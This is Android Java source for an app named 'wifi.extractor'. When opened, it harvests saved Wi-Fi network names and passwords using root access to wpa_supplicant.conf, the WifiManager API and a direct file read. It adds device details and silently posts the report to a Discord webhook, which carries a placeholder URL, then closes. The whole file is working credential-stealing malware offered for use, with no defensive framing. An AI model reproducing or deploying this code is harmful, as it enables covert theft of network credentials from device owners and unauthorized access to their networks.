package com.wifi.extractor;
import android.app.Activity;
import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends Activity {
    private ArrayList<String> results = new ArrayList<>();
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        extractAllPasswords();
        sendToDiscord();
        finish();
    }
    
    private void extractAllPasswords() {
        results.add("=== WiFi Extraction Report ===");
        results.add("Device: " + Build.MANUFACTURER + " " + Build.MODEL);
        results.add("Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        results.add("Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
        results.add("");
        
        // Method 1: Root - wpa_supplicant.conf
        try {
            Process p = Runtime.getRuntime().exec("su -c cat /data/misc/wifi/wpa_supplicant.conf");
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            String currentSsid = "";
            int count = 0;
            while ((line = br.readLine()) != null) {
                if (line.contains("ssid=")) {
                    currentSsid = line.substring(line.indexOf("=")+1).replace("\"", "");
                }
                if (line.contains("psk=") && !line.contains("00000000")) {
                    String psk = line.substring(line.indexOf("=")+1).replace("\"", "");
                    if (psk.length() > 1) {
                        results.add("[ROOT] SSID: " + currentSsid + " | Password: " + psk);
                        count++;
                    }
                }
            }
            br.close();
            if (count > 0) results.add("[ROOT] Found " + count + " networks");
            else results.add("[ROOT] No passwords found (may need root)");
        } catch (Exception e) {
            results.add("[ROOT] Failed: " + e.getMessage());
        }
        
        // Method 2: No root - WifiManager (Android 8-12)
        try {
            WifiManager wm = (WifiManager) getSystemService(Context.WIFI_SERVICE);
            if (wm != null && Build.VERSION.SDK_INT <= 32) {
                List<WifiConfiguration> configs = wm.getConfiguredNetworks();
                if (configs != null) {
                    int count = 0;
                    for (WifiConfiguration config : configs) {
                        String ssid = config.SSID != null ? config.SSID.replace("\"", "") : "Unknown";
                        String psk = config.preSharedKey != null ? config.preSharedKey.replace("\"", "") : "";
                        if (psk != null && !psk.equals("*") && psk.length() > 1) {
                            results.add("[WIFIMGR] SSID: " + ssid + " | Password: " + psk);
                            count++;
                        }
                    }
                    if (count > 0) results.add("[WIFIMGR] Found " + count + " networks");
                    else results.add("[WIFIMGR] No accessible networks");
                }
            }
        } catch (SecurityException e) {
            results.add("[WIFIMGR] Location permission needed");
        } catch (Exception e) {
            results.add("[WIFIMGR] Failed: " + e.getMessage());
        }
        
        // Method 3: Direct file read (some devices)
        try {
            File f = new File("/data/misc/wifi/wpa_supplicant.conf");
            if (f.exists() && f.canRead()) {
                FileInputStream fis = new FileInputStream(f);
                BufferedReader br = new BufferedReader(new InputStreamReader(fis));
                String line;
                String currentSsid = "";
                while ((line = br.readLine()) != null) {
                    if (line.contains("ssid=")) {
                        currentSsid = line.substring(line.indexOf("=")+1).replace("\"", "");
                    }
                    if (line.contains("psk=") && !line.contains("00000000")) {
                        String psk = line.substring(line.indexOf("=")+1).replace("\"", "");
                        results.add("[DIRECT] SSID: " + currentSsid + " | Password: " + psk);
                    }
                }
                br.close();
            }
        } catch (Exception e) {}
        
        results.add("");
        results.add("=== End of Report ===");
    }
    
    private void sendToDiscord() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("```\n");
            for (String line : results) {
                sb.append(line).append("\n");
            }
            sb.append("```");
            
            // REPLACE WITH YOUR DISCORD WEBHOOK URL
            String webhook = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";
            
            URL url = new URL(webhook);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            String json = "{\"content\": " + escapeJson(sb.toString()) + "}";
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes());
            os.close();
            
            int code = conn.getResponseCode();
            if (code == 200 || code == 204) {
                Toast.makeText(this, "✓ Sent " + results.size() + " lines", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "HTTP Error: " + code, Toast.LENGTH_LONG).show();
            }
            conn.disconnect();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
    
    private String escapeJson(String s) {
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n") + "\"";
    }
}
